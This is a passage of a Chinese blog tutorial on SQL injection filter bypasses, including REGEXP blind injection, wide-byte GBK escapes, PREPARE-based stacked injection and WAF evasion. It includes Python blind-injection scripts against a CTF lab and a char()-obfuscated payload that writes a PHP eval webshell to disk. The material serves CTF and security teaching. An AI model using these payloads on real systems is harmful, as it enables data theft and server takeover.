<span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line">            payloads = payload.<span class="built_in">format</span>(name + j)</span><br><span class="line">            urls = url + payloads</span><br><span class="line">            r = requests.get(urls)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                name += j</span><br><span class="line">                <span class="built_in">print</span>(j, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                char = j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> char == <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="REGEXP-注入"><a href="#REGEXP-注入" class="headerlink" title="REGEXP 注入"></a>REGEXP 注入</h3><p>REGEXP注入，即regexp正则表达式注入。REGEXP注入，又叫盲注值正则表达式攻击。应用场景就是盲注，原理是直接查询自己需要的数据，然后通过正则表达式进行匹配。</p><ol><li><p>判断数据库长度</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?<span class="built_in">id</span>=<span class="string">&#x27; or (length(database())) regexp 8 --+  // 回显正常</span></span><br></pre></td></tr></table></figure></li><li><p>判断数据库名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/?<span class="built_in">id</span>=<span class="string">&#x27; or database() regexp &#x27;</span>^s<span class="string">&#x27;--+    // 回显正常</span></span><br><span class="line"><span class="string">/?id=&#x27;</span> or database() regexp <span class="string">&#x27;se&#x27;</span>--+    // 回显正常, 不适用^和$进行匹配也可以</span><br><span class="line">/?<span class="built_in">id</span>=<span class="string">&#x27; or database() regexp &#x27;</span>^sa<span class="string">&#x27;--+   // 报错</span></span><br><span class="line"><span class="string">/?id=&#x27;</span> or database() regexp <span class="string">&#x27;y$&#x27;</span>--+    // 回显正常</span><br></pre></td></tr></table></figure></li></ol><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># strs = string.printable</span></span><br><span class="line">strs = string.ascii_letters + string.digits + <span class="string">&#x27;_&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&#x27; or (select database()) regexp &#x27;^&#123;&#125;&#x27;--+&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">40</span>):</span><br><span class="line">        char = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line">            payloads = payload.<span class="built_in">format</span>(name + j)</span><br><span class="line">            urls = url + payloads</span><br><span class="line">            r = requests.get(urls)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                name += j</span><br><span class="line">                <span class="built_in">print</span>(j, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                char = j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> char == <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>以上脚本都要注意是掌握编写思路，不是干抄脚本。</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>前置知识</p><p><strong>magic_quotes_gpc （魔术引号开关</strong><br>magic_quotes_gpc函数在php中的作用是判断解析用户提交的数据，如包括有：post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。</p><p>单引号（’）、双引号（”）、反斜线（\）等字符都会被加上反斜线，我们输入的东西如果不能闭合，那我们的输入就不会当作代码执行，就无法产生SQL注入。</p><p><strong>addslashes()函数</strong></p><p>返回在预定义字符之前添加反斜杠的字符串</p><p>预定义字符：单引号（’），双引号（”），反斜杠（\），NULL</p><p>宽字节概念：</p><ol><li>单字节字符集：所有的字符都使用一个字节来表示，比如 ASCII 编码(0-127)</li><li>多字节字符集：在多字节字符集中，一部分字节用多个字节来表示，另一部分（可能没有）用单个字节来表示。</li><li>UTF-8 编码： 是一种编码的编码方式（多字节编码），它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度。</li><li>常见的宽字节： GB2312、GBK、GB18030、BIG5、Shift_JIS GB2312 不存在宽字节注入，可以收集存在宽字节注入的编码。</li><li>宽字节注入时利用mysql的一个特性，使用GBK编码的时候，会认为两个字符是一个汉字</li></ol><p>宽字节SQL注入主要是源于程序员设置数据库编码为非英文编码那么就有可能产生宽字节注入。</p><p>例如说MySql的编码设置为了SET NAMES ‘gbk’或是 SET character_set_client &#x3D;gbk，这样配置会引发编码转换从而导致的注入漏洞。</p><p>宽字节SQL注入的根本原因:</p><p>宽字节SQL注入就是PHP发送请求到MySql时使用了语句</p><p>SET NAMES ‘gbk’ 或是SET character_set_client &#x3D;gbk 进行了一次编码，但是又由于一些不经意的字符集转换导致了宽字节注入。</p><p>magic_quotes_gpc的作用：当PHP的传参中有特殊字符就会在前面加转义字符’&#39;,来做一定的过滤</p><p>为了绕过magic_quotes_gpc的,于是乎我们开始导入宽字节的概念</p><p>我们发现\的编码是%5c，然后我们会想到传参一个字符想办法凑成一个gbk字符,例如：‘運’字是%df%5c</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM <span class="built_in">users</span> WHERE <span class="built_in">id</span>=<span class="string">&#x27;1\&#x27;</span><span class="string">&#x27; LIMIT 0,1</span></span><br></pre></td></tr></table></figure><p>这条语句因为\使我们无法去注入，那么我们是不是可以用%df吃到%5c,因为如果用GBK编码的话这个就是運，然后成功绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM <span class="built_in">users</span> WHERE <span class="built_in">id</span>=<span class="string">&#x27;1�\&#x27;</span><span class="comment">#&#x27; LIMIT 0,1</span></span><br></pre></td></tr></table></figure><p>虽然是写在了过滤引号的位置但是其实不止适用于过滤引号<br>使用反斜杠 \ 逃逸 Sql 语句<br>如果没有过滤反斜杠的话，我们可以使用反斜杠将后面的引号转义，从而逃逸后面的 Sql 语句。</p><p>假设sql语句为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username, password from <span class="built_in">users</span> <span class="built_in">where</span> username=<span class="string">&#x27;$username&#x27;</span> and password=<span class="string">&#x27;$password&#x27;</span>;</span><br></pre></td></tr></table></figure><p>假设输入的用户名是 admin\，密码输入的是 or 1# 整个SQL语句变成了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from <span class="built_in">users</span> <span class="built_in">where</span> username=<span class="string">&#x27;admin\&#x27;</span> and password=<span class="string">&#x27; or 1#&#x27;</span></span><br></pre></td></tr></table></figure><p>由于单引号被转义，and password&#x3D;这部分都成了username的一部分，即</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="string">&#x27;admin\&#x27;</span> and password=<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>这样 or 1 就逃逸出来了，由此可控，可作为注入点了。</p><h3 id="堆叠注入时利用-MySql-预处理"><a href="#堆叠注入时利用-MySql-预处理" class="headerlink" title="堆叠注入时利用 MySql 预处理"></a>堆叠注入时利用 MySql 预处理</h3><p>在遇到堆叠注入时，如果select、rename、alter和handler等语句都被过滤的话，我们可以用MySql预处理语句配合concat拼接来执行sql语句拿flag。</p><ol><li>PREPARE：准备一条SQL语句，并分配给这条SQL语句一个名字(hello)供之后调用</li><li>EXECUTE：执行命令</li><li>DEALLOCATE PREPARE：释放命令</li><li>SET：用于设置变量(@a)</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;sEt @a=concat(&quot;sel&quot;,&quot;ect flag from flag_here&quot;);PRepare hello from @a;execute hello;#</span></span><br></pre></td></tr></table></figure><p>这里还用大小写简单绕了一下其他过滤</p><p><strong>MySql 预处理配合十六进制绕过关键字</strong><br>基本原理如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select hex(<span class="string">&#x27;show databases&#x27;</span>);</span><br><span class="line">+------------------------------+</span><br><span class="line">| hex(<span class="string">&#x27;show databases;&#x27;</span>)       |</span><br><span class="line">+------------------------------+</span><br><span class="line">| 73686F7720646174616261736573 |</span><br><span class="line">+------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="built_in">set</span> @b=0x73686F7720646174616261736573;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; prepare <span class="built_in">test</span> from @b;</span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br><span class="line">Statement prepared</span><br><span class="line"></span><br><span class="line">mysql&gt; execute <span class="built_in">test</span>;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| challenges         |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| security           |</span><br><span class="line">| <span class="built_in">test</span>               |</span><br><span class="line">+--------------------+</span><br><span class="line">6 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.02 sec)</span><br></pre></td></tr></table></figure><p>即payload类似如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;sEt @a=0x73686F7720646174616261736573;PRepare hello from @a;execute hello;#</span></span><br></pre></td></tr></table></figure><p><strong>MySql预处理配合字符串拼接绕过关键字</strong><br>原理就是借助char()函数将ascii码转化为字符然后再使用concat()函数将字符连接起来，有了前面的基础这里应该很好理解了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> @sql=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(39),char(60),char(63),char(112),char(104),char(112),char(32),char(101),char(118),char(97),char(108),char(40),char(36),char(95),char(80),char(79),char(83),char(84),char(91),char(119),char(104),char(111),char(97),char(109),char(105),char(93),char(41),char(59),char(63),char(62),char(39),char(32),char(105),char(110),char(116),char(111),char(32),char(111),char(117),char(116),char(102),char(105),char(108),char(101),char(32),char(39),char(47),char(118),char(97),char(114),char(47),char(119),char(119),char(119),char(47),char(104),char(116),char(109),char(108),char(47),char(102),char(97),char(118),char(105),char(99),char(111),char(110),char(47),char(115),char(104),char(101),char(108),char(108),char(46),char(112),char(104),char(112),char(39),char(59));prepare s1 from @sql;execute s1;</span><br></pre></td></tr></table></figure><p>也可以不用concat函数，直接用char函数也具有连接功能：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> @sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,119,104,111,97,109,105,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare s1 from @sql;execute s1;</span><br></pre></td></tr></table></figure><h3 id="过滤逗号绕过"><a href="#过滤逗号绕过" class="headerlink" title="过滤逗号绕过"></a>过滤逗号绕过</h3><p>当逗号被过滤了之后，我们便不能向下面这样正常的时候substr()函数和limit语句了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substr((select database()),1,1);</span><br><span class="line">select * from <span class="built_in">users</span> <span class="built_in">limit</span> 0,1;</span><br></pre></td></tr></table></figure><p><strong>使用from…for…绕过</strong><br>我们可以使用 from…for.. 语句替换 substr() 函数里的 ,1,1：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">select substr((select database()) from 1 <span class="keyword">for</span> 1);</span><br><span class="line"><span class="comment"># 此时 from 1 for 1 中的两个1分别代替 substr() 函数里的两个1</span></span><br><span class="line"></span><br><span class="line">select substr((select database()) from 1 <span class="keyword">for</span> 1);    <span class="comment"># s</span></span><br><span class="line">select substr((select database()) from 2 <span class="keyword">for</span> 1);    <span class="comment"># e</span></span><br><span class="line">select substr((select database()) from 3 <span class="keyword">for</span> 1);    <span class="comment"># c</span></span><br><span class="line">select substr((select database()) from 4 <span class="keyword">for</span> 1);    <span class="comment"># u</span></span><br><span class="line">select substr((select database()) from 5 <span class="keyword">for</span> 1);    <span class="comment"># r</span></span><br><span class="line">select substr((select database()) from 6 <span class="keyword">for</span> 1);    <span class="comment"># i</span></span><br><span class="line">select substr((select database()) from 7 <span class="keyword">for</span> 1);    <span class="comment"># t</span></span><br><span class="line">select substr((select database()) from 8 <span class="keyword">for</span> 1);    <span class="comment"># y</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果过滤了空格, 则可以使用括号来代替空格:</span></span><br><span class="line">select substr((select database())from(1)<span class="keyword">for</span>(1));    <span class="comment"># s</span></span><br><span class="line">select substr((select database())from(2)<span class="keyword">for</span>(1));    <span class="comment"># e</span></span><br><span class="line">select substr((select database())from(3)<span class="keyword">for</span>(1));    <span class="comment"># c</span></span><br><span class="line">select substr((select database())from(4)<span class="keyword">for</span>(1));    <span class="comment"># u</span></span><br><span class="line">select substr((select database())from(5)<span class="keyword">for</span>(1));    <span class="comment"># r</span></span><br><span class="line">select substr((select database())from(6)<span class="keyword">for</span>(1));    <span class="comment"># i</span></span><br><span class="line">select substr((select database())from(7)<span class="keyword">for</span>(1));    <span class="comment"># t</span></span><br><span class="line">select substr((select database())from(8)<span class="keyword">for</span>(1));    <span class="comment"># y</span></span><br></pre></td></tr></table></figure><p>即，from用来指定从何处开始截取，for用来指定截取的长度，如果不加for的话则 from 1 就相当于从字符串的第一位一直截取到最后：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">select substr((select database()) from 1);    <span class="comment"># security</span></span><br><span class="line">select substr((select database()) from 2);    <span class="comment"># ecurity</span></span><br><span class="line">select substr((select database()) from 3);    <span class="comment"># curity</span></span><br><span class="line">select substr((select database()) from 4);    <span class="comment"># urity</span></span><br><span class="line">select substr((select database()) from 5);    <span class="comment"># rity</span></span><br><span class="line">select substr((select database()) from 6);    <span class="comment"># ity</span></span><br><span class="line">select substr((select database()) from 7);    <span class="comment"># ty</span></span><br><span class="line">select substr((select database()) from 8);    <span class="comment"># y</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可以使用负数来倒着截取:</span></span><br><span class="line">select substr((select database())from(-1));    <span class="comment"># y</span></span><br><span class="line">select substr((select database())from(-2));    <span class="comment"># ty</span></span><br><span class="line">select substr((select database())from(-3));    <span class="comment"># ity</span></span><br><span class="line">select substr((select database())from(-4));    <span class="comment"># rity</span></span><br><span class="line">select substr((select database())from(-5));    <span class="comment"># urity</span></span><br><span class="line">select substr((select database())from(-6));    <span class="comment"># curity</span></span><br><span class="line">select substr((select database())from(-7));    <span class="comment"># ecurity</span></span><br><span class="line">select substr((select database())from(-8));    <span class="comment"># security</span></span><br></pre></td></tr></table></figure><p><strong>使用offset关键字绕过</strong><br>我们可以使用 offset 语句替换 limit 语句里的逗号：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from <span class="built_in">users</span> <span class="built_in">limit</span> 1 offset 2;</span><br><span class="line"><span class="comment"># 此时 limit 1 offset 2 可以代替 limit 1,2</span></span><br></pre></td></tr></table></figure><p><strong>利用join与别名绕过</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select host,user from user <span class="built_in">where</span> user=<span class="string">&#x27;a&#x27;</span>union(select*from((select`table_name`from`information_schema`.`tables`<span class="built_in">where</span>`table_schema`=<span class="string">&#x27;mysql&#x27;</span>)`a`<span class="built_in">join</span>(select`table_type`from`information_schema`.`tables`<span class="built_in">where</span>`table_schema`=<span class="string">&#x27;mysql&#x27;</span>)b));</span><br></pre></td></tr></table></figure><p><strong>过滤information_schema绕过与无列名注入</strong></p><p>当过滤or时，这个库就会被过滤，那么mysql在被waf禁掉了information_schema库后还能有哪些利用思路呢？</p><p>information_schema 简单来说，这个库在mysql中就是个信息数据库，它保存着mysql服务器所维护的所有其他数据库的信息，包括了数据库名，表名，字段名等。在注入中，infromation_schema库的作用无非就是可以获取到table_schema、table_name、column_name这些数据库内的信息。</p><p>能够代替information_schema的有：<br>sys.schema_auto_increment_columns 只显示有自增的表<br>sys.schema_table_statistics_with_buffer<br>x$schema_table_statistics_with_buffer</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user <span class="built_in">where</span> <span class="built_in">id</span> = -1 union all select 1,2,3,group_concat(table_name)from sys.schema_table_statistics_with_buffer <span class="built_in">where</span> table_schema=database();</span><br></pre></td></tr></table></figure><p>mysql.innodb_table_stats<br>mysql.innodb_table_index</p><p>以上大部分特殊数据库都是在 mysql5.7 以后的版本才有，并且要访问sys数据库需要有相应的权限。</p><p>但是在使用上面的后两个表来获取表名之后select group_concat(table_name) from mysql.innodb_table_stats，我们是没有办法获得列的，这个时候就要采用无列名注入的办法。</p><h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><p>123法<br>我们可以利用一些查询上的技巧来进行无列名、表名的注入。</p><p>在我们直接select 1,2,3时，会创建一个虚拟的表<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241559936.png"></p><p>如图所见列名会被定义为1，2，3</p><p>当我们结合了union联合查询之后</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241559064.png"></p><p>如图，我们的列名被替换为了对应的数字。也就是说，我们可以继续数字来对应列，如 3 对应了表里面的 password，进而我们就可以构造这样的查询语句来查询password：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select `3` from (select 1,2,3 union select * from <span class="built_in">users</span>)a;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241600996.png"><br>末尾的 a 可以是任意字符，用于命名</p><p>当然，多数情况下，反引号会被过滤。当反引号不能使用的时候，可以使用别名来代替：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select b from (select 1,2,3 as b union select * from admin)a;</span><br></pre></td></tr></table></figure><p>join<br>我们可以利用爆错，借助join和using爆出列名，id为第一列，username为第二列，可以逐个爆出，爆出全部列名之后即可得到列内数据。<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241600089.png"></p><h3 id="过滤其他关键字绕过"><a href="#过滤其他关键字绕过" class="headerlink" title="过滤其他关键字绕过"></a>过滤其他关键字绕过</h3><p>过滤 if 语句绕过<br>如果过滤了 if 关键字的话，我们可以使用case when语句绕过：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(condition,1,0) &lt;=&gt; <span class="keyword">case</span> when condition <span class="keyword">then</span> 1 <span class="keyword">else</span> 0 end</span><br></pre></td></tr></table></figure><p>下面的if语句和case when语句是等效的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0<span class="string">&#x27; or if((ascii(substr((select database()),1,1))&gt;97),1,0)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0&#x27;</span> or <span class="keyword">case</span> when ascii(substr((select database()),1,1))&gt;97 <span class="keyword">then</span> 1 <span class="keyword">else</span> 0 end<span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="过滤-substr-绕过"><a href="#过滤-substr-绕过" class="headerlink" title="过滤 substr 绕过"></a>过滤 substr 绕过</h3><ul><li><p>使用 lpad&#x2F;lpad<br>使用lpad()和rpad()绕过substr()</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">select lpad((select database()),1,1)    // s</span><br><span class="line">select lpad((select database()),2,1)    // se</span><br><span class="line">select lpad((select database()),3,1)    // sec</span><br><span class="line">select lpad((select database()),4,1)    // secu</span><br><span class="line">select lpad((select database()),5,1)    // secur</span><br><span class="line">select lpad((select database()),6,1)    // securi</span><br><span class="line">select lpad((select database()),7,1)    // securit</span><br><span class="line">select lpad((select database()),8,1)    // security</span><br><span class="line"></span><br><span class="line">select rpad((select database()),1,1)    // s</span><br><span class="line">select rpad((select database()),2,1)    // se</span><br><span class="line">select rpad((select database()),3,1)    // sec</span><br><span class="line">select rpad((select database()),4,1)    // secu</span><br><span class="line">select rpad((select database()),5,1)    // secur</span><br><span class="line">select rpad((select database()),6,1)    // securi</span><br><span class="line">select rpad((select database()),7,1)    // securit</span><br><span class="line">select rpad((select database()),8,1)    // security</span><br></pre></td></tr></table></figure><p>lpad：函数语法：lpad(str1,length,str2)。其中str1是第一个字符串，length是结果字符串的长度，str2是一个填充字符串。如果str1的长度没有length那么长，则使用str2填充；如果str1的长度大于length，则截断。<br>rpad：同理</p></li><li><p>使用left()绕过substr()</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select left((select database()),1)    // s</span><br><span class="line">select left((select database()),2)    // se</span><br><span class="line">select left((select database()),3)    // sec</span><br><span class="line">select left((select database()),4)    // secu</span><br><span class="line">select left((select database()),5)    // secur</span><br><span class="line">select left((select database()),6)    // securi</span><br><span class="line">select left((select database()),7)    // securit</span><br><span class="line">select left((select database()),8)    // security</span><br></pre></td></tr></table></figure></li><li><p>使用mid()绕过substr()</p></li></ul><p>mid()函数的使用就和substr()函数一样了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select mid((select database()),1,1)    // s</span><br><span class="line">select mid((select database()),2,1)    // e</span><br><span class="line">select mid((select database()),3,1)    // c</span><br><span class="line">select mid((select database()),4,1)    // u</span><br><span class="line">select mid((select database()),5,1)    // r</span><br><span class="line">......</span><br></pre></td></tr></table></figure><ul><li>还可以使用下面这个神奇的东西绕过<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select insert(insert((select database()),1,0,space(0)),2,222,space(0));    // s</span><br><span class="line">select insert(insert((select database()),1,1,space(0)),2,222,space(0));    // e</span><br><span class="line">select insert(insert((select database()),1,2,space(0)),2,222,space(0));    // c</span><br><span class="line">select insert(insert((select database()),1,3,space(0)),2,222,space(0));    // u</span><br><span class="line">select insert(insert((select database()),1,4,space(0)),2,222,space(0));    // r</span><br><span class="line">select insert(insert((select database()),1,5,space(0)),2,222,space(0));    // i</span><br><span class="line">select insert(insert((select database()),1,6,space(0)),2,222,space(0));    // t</span><br><span class="line">......</span><br></pre></td></tr></table></figure>INSERT( string , position , number , string2 )</li></ul><p>INSERT()函数在指定位置的字符串中插入一个字符串，并插入一定数量的字符。</p><h3 id="HTTP参数污染-HPP-漏洞绕过-Waf"><a href="#HTTP参数污染-HPP-漏洞绕过-Waf" class="headerlink" title="HTTP参数污染(HPP)漏洞绕过 Waf"></a>HTTP参数污染(HPP)漏洞绕过 Waf</h3><p>HPP是HTTP Parameter Pollution的缩写，意为HTTP参数污染。浏览器在跟服务器进行交互的过程中，浏览器往往会在GET或POST请求里面带上参数，这些参数会以 键-值 对的形势出现，通常在一个请求中，同样名称的参数只会出现一次。</p><p>但是在HTTP协议中是允许同样名称的参数出现多次的。比如下面这个链接：<a href="http://www.baidu.com/?name=aa&amp;name=bb%EF%BC%8C%E9%92%88%E5%AF%B9%E5%90%8C%E6%A0%B7%E5%90%8D%E7%A7%B0%E7%9A%84%E5%8F%82%E6%95%B0%E5%87%BA%E7%8E%B0%E5%A4%9A%E6%AC%A1%E7%9A%84%E6%83%85%E5%86%B5%EF%BC%8C%E4%B8%8D%E5%90%8C%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F%E4%BC%9A%E4%B8%8D%E4%B8%80%E6%A0%B7%E3%80%82%E6%9C%89%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%98%AF%E5%8F%96%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8F%82%E6%95%B0%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF">http://www.baidu.com?name=aa&amp;name=bb，针对同样名称的参数出现多次的情况，不同的服务器的处理方式会不一样。有的服务器是取第一个参数，也就是</a> name&#x3D;aa。有的服务器是取第二个参数，也就是 name&#x3D;bb。有的服务器两个参数都取，也就是 name&#x3D;aa,bb。这种特性在绕过一些服务器端的逻辑判断时，非常有用。</p><p>HPP漏洞，与Web服务器环境、服务端使用的脚本有关。如下是不同类型的Web服务器对于出现多个参数时的选择：</p><table><thead><tr><th>表头Web 